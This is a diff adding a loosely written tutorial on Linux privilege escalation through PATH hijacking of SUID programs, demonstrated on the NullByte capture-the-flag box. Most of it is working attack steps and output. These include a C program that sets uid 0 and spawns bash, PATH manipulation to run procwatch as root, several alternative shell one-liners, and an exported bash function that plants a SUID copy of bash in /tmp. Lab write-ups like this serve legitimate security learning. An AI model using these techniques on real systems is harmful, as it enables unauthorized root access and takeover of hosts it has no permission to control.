@@ -1,0 +1,125 @@
+This is the mathod where we have suid set on any program and that program calling another executable binary to run....
+
+so when the suid program call the another executable binary to execute from their path...program execute it.
+
+
+for example we have a suid name as time and in inside the time program it execute another binary let say date,and when we run suid time it run with the permission of root or set by any other user,while run i'll call date form their path whic is set in env like from /bin/date to execute.and date is run as root here.and executed.
+
+
+So how we can take advantage : We can change the Envoirement path to our shell shell code path,and when the suid program time execute i'll call our shell code instead of /bin/date because we've already set the env path to /tmp/date.  when our date will execute i'll drop the shell of suid owner.
+
+
+let's do it practically...
+1) how we know suid calling which program...?
+
+And - We have string command by which we can see the stings of the program,with string could see which service or progam being call inside of it.if there is any strings matches with any command or program we've to figured it out manually.
+
+like in Nullbyte box i have a suid progam name as procwath
+which was execute ps command when we run procwatch,
+
+output of suid...
+
+  PID TTY          TIME CMD
+14900 pts/0    00:00:00 ps
+15497 pts/0    00:00:00 bash
+
+
+
+and ps out  was the same as the suid program.and ps is located in ...
+
+ramses@NullByte:/var/mail$ which ps
+/bin/ps
+
+2)Check Your path via command "env"
+
+PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+
+Here We can see tha path is set to /usr/local/bin or /usr/bin to call binary program.
+
+3) Now We'll make a binary in c and append our shell or malacious progam by which we can scape the privilages to roo.
+
+ ramses@NullByte:/tmp$ echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0 ; }'>/tmp/ps.c
+
+4) We've created a c program let's compile it to execute as binary program
+
+ramses@NullByte:/tmp$ cat /tmp/ps.c 
+int main() { setgid(0); setuid(0); system("/bin/bash"); return 0 ; }
+
+5) compile 
+
+ramses@NullByte:/tmp$ gcc ps.c -o ps
+
+6) Setting the env path to where our program exists.
+
+ramses@NullByte:/$ export PATH=/tmp:$PATH
+
+7) Now chech if it done..
+
+ramses@NullByte:/$ echo $PATH
+/tmp:/tmp:/tmp:/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+
+we're done with the all now it's time to run the suid program which will call our ps instead of /bin/ps
+
+8) Escape to root....
+
+ramses@NullByte:/var/www/backup$ ls
+procwatch  readme.txt
+ramses@NullByte:/var/www/backup$ ./procwatch 
+root@NullByte:/var/www/backup# id
+uid=0(root) gid=0(root) groups=0(root),1002(ramses)
+root@NullByte:/var/www/backup# whoami
+root
+
+
+
+
+We've succesfully done this.....cheers
+
+
+
+Another mathods....
+2)
+
+echo "/bin/sh"  > ps
+chmod 777 ps
+echo $PATH
+export PATH=.:$PATH
+echo $PATH
+./procwatch
+
+#
+
+3) 
+cp /bin/sh /tmp/ps
+echo $PATH
+export PATH=/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+./procwatch
+
+#
+
+4)
+vi ps and append  >> /bin/sh
+chmod 777 ps
+echo $PATH
+export PATH=.:$PATH
+cd /var/www/backup
+./procwatch
+
+#
+
+
+
+
+If any suid calling a binary as path 
+
+like insite of suid  : /usr/sbin/service apache2 start
+
+then create a function as : function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p;}
+
+
+NOw export  :  export -f /usr/sbin/service  
+
+now execute the suid or : /usr/local/bin/suid-env2
+
+#
+we're root
